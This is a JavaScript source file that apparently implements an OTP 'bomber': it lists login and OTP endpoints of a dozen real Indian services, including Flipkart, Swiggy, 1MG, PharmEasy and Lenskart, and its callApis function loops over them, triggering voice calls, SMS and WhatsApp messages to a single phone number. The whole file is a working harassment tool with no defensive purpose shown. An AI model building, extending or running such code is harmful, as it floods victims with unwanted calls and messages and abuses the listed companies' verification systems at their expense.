 const ULTIMATE_APIS = [
  {
    name: "Tata Capital Voice Call",
    type: "Call",
    url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    data: (phone) => {
      return JSON.stringify({
        phone: phone,
        isOtpViaCallAtLogin: true
      });
    }
  },
  {
    name: "1MG Voice Call",
    type: "Call",
    url: "https://www.1mg.com/auth_api/v6/create_token",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    data: (phone) => {
      return JSON.stringify({
        number: phone,
        otp_on_call: true
      });
    }
  },
  {
    name: "Swiggy Call Verification",
    type: "Call",
    url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    data: (phone) => {
      return JSON.stringify({
        mobile: phone
      });
    }
  },
  {
    name: "Flipkart Voice Call",
    type: "Call",
    url: "https://www.flipkart.com/api/6/user/voice-otp/generate",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    data: (phone) => {
      return JSON.stringify({
        mobile: phone
      });
    }
  },
  {
    name: "Zivame Voice Call",
    type: "Call",
    url: "https://api.zivame.com/v2/customer/login/send-otp",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    data: (phone) => {
      return JSON.stringify({
        phone_number: phone,
        otp_type: "voice"
      });
    }
  },
  {
    name: "Lenskart SMS",
    type: "SMS",
    url: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    data: (phone) => {
      return JSON.stringify({
        phoneCode: "+91",
        telephone: phone
      });
    }
  },
  {
    name: "PharmEasy SMS",
    type: "SMS",
    url: "https://pharmeasy.in/api/v2/auth/send-otp",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    data: (phone) => {
      return JSON.stringify({
        phone: phone
      });
    }
  },
  {
    name: "Snitch SMS",
    type: "SMS",
    url: "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    data: (phone) => {
      return JSON.stringify({
        mobile_number: "+91" + phone
      });
    }
  },
  {
    name: "ShipRocket SMS",
    type: "SMS",
    url: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    data: (phone) => {
      return JSON.stringify({
        mobileNumber: phone
      });
    }
  },
  {
    name: "GoKwik SMS",
    type: "SMS",
    url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    data: (phone) => {
      return JSON.stringify({
        phone: phone,
        country: "in"
      });
    }
  },
  {
    name: "NewMe SMS",
    type: "SMS",
    url: "https://prodapi.newme.asia/web/otp/request",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    data: (phone) => {
      return JSON.stringify({
        mobile_number: phone,
        resend_otp_request: true
      });
    }
  },
  {
    name: "KPN WhatsApp",
    type: "WhatsApp",
    url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    data: (phone) => {
      return JSON.stringify({
        notification_channel: "WHATSAPP",
        phone_number: {
          country_code: "+91",
          number: phone
        }
      });
    }
    }
];
async function callApis(phone) {
    for (const api of ULTIMATE_APIS) {
        try {
            const response = await fetch(api.url, {
                method: api.method,
                headers: api.headers,
                body: api.data(phone)   // ✅ FIX ADDED HERE
            });

            const data = await response.json();
            console.log(api.name, data);

        } catch (error) {
            console.error(api.name, error);
        }
    }
      }
